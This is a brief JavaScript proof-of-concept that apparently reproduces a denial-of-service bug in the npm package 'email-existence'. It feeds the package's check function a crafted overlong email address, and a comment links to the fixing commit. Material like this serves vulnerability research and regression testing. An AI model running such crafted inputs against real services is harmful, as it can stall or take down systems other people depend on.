const emailExistence =  require('email-existence');
const { genstr } = require('./utils');


attack_str = 'a@' + genstr(400,'a') + '.com';
emailExistence.check(attack_str);
//https://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56